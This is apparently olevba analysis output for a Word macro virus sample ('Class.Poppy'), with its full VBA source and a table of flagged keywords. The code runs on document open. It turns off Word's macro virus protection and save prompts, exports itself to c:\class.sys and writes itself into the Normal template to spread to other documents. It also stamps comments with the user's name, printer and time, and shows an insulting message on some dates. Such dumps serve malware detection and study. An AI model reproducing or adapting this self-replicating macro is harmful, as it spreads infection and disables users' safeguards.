olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class-3d624437c7efcccbdb995e4ed39ead2af9905db5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class-3d624437c7efcccbdb995e4ed39ead2af9905db5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'翁文能1999/7/5 04:59:29 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
On Error GoTo out
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
Options.VirusProtection = False
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
Options.SaveNormalPrompt = False
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
Options.ConfirmConversions = False
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If nt > 70 And ad > 0 Then GoTo out
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If nt < 70 Then
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End If
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
host.codemodule.AddFromFile ("c:\class.sys")
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
With host.codemodule
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    For x = 1 To 4
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    .deletelines 1
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    Next x
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End With
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If nt < 70 Then
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    With host.codemodule
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    .replaceline 1, "Sub AutoClose()"
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    .replaceline 71, "Sub ToolsMacro()"
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    End With
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End If
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
With host.codemodule
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    For x = 2 To 72 Step 2
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
    Next x
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End With
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
out:
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End Sub
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
Sub ViewVBCode()
'翁文能1999/7/5 04:59:30 PMCanon  BJC-255SP - LPT1:8807-管理審查會議
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

